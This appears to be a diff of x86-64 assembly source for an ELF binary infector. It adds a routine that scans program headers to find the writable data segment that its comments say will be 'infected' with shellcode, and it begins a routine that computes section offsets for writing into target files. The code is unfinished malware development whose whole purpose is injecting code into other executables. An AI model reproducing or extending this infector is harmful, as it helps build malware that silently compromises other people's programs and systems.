@@ -438,12 +438,11 @@ retn
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 
-	sub rsp, 8; will store pad value
 
 	call parse64elfheader
 	call parse64elfphdr ; will return pad
-
-	add rsp, 8
+	mov rdx, rax; pass pad as 3rd param
+	call parse64elfsec
 retn
 
 parse64elfheader:
@@ -484,7 +483,7 @@ parse64elfheader:
 	pop rdi
 retn
 %define SHELLCODE_LEN 1
-; unsigned long find_new_entry(void *file, int wfd)
+; unsigned long find_new_entry(void *file)
 ; will return the offset to begining of our shellcode
 find_new_entry:
 	push rdi
@@ -532,7 +531,54 @@ find_new_entry:
 	pop rsi
 	pop rdi
 retn
+; unsigned long find_end_data_seg(void *)
+; will return the offset at which shellcode starts and where dataseg ends
+find_end_data_seg:
+	push rdi
+	push rsi
+	push rdx
+	push rcx
+	push rbx
+	push r9
 
+	sub rsp, 2; e_phnum
+
+	xor rax, rax
+	mov bx,  WORD[rdi + 56]
+	mov WORD[rsp], bx; e_phnum stored
+	mov rbx, QWORD[rdi + 32]
+	add rdi, rbx; rdi now point to e_phoff
+	mov rbx, rdi; swap rdi and rsi for syscalls
+	mov rdi, rsi
+	mov rsi, rbx
+
+	xor rcx, rcx
+	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
+	loop_feds: 
+		cmp cx, WORD[rsp]
+		jge loop_feds_exit
+		lea r9, [rsi+rdx]; current phdr
+		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
+		jne continue_feds
+		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
+		jne continue_feds
+		;we found the data segment ! bss ect... This is where the shellcode will be
+		mov rax, QWORD[r9 + 32];store p_filesz
+		add rax, QWORD[r9 + 8]; add p_offset so this gives us "the end" of the segment
+		continue_feds:
+		inc rcx
+		add rdx, 56; rdx += sizeof(Elf64_Phdr)
+		jmp loop_feds
+	loop_feds_exit: 
+	add rsp, 2
+	
+	pop r9
+	pop rbx
+	pop rcx
+	pop rdx
+	pop rsi
+	pop rdi
+retn
 ; unsigned long parse64elfphdr(void *file, int wfd)
 parse64elfphdr:
 	push rdi
@@ -678,4 +724,23 @@ parse64elfphdr:
 	pop rdx
 	pop rsi
 	pop rdi
+retn
+
+;void parse64elfsec(void *file, int wfd, unsigned long pad)
+parse64elfsec:
+
+	sub rsp, 8;start offset 
+	; first we swap file and wfd for syscalls
+	mov rbx, rsi
+	mov rsi, rdi
+	mov rdi, rbx
+	;now we need to calculate the offset to EHDR + PHDR*e_phnum
+	xor rbx, rbx
+	mov bx, WORD[rsi + 56]; bx == e_phnum
+	mov rax, 56; sizeof(Elf64_Phdr)
+	mul rbx; rbx * rax -> rax
+	add rax, QWORD[rsi + 32]; e_phoff
+	mov [rsp], rax; [rsp] ==  e_phoff + (sizeof(Elf64_Phdr) * e_phnum)
+	
+	add rsp, 8
 retn
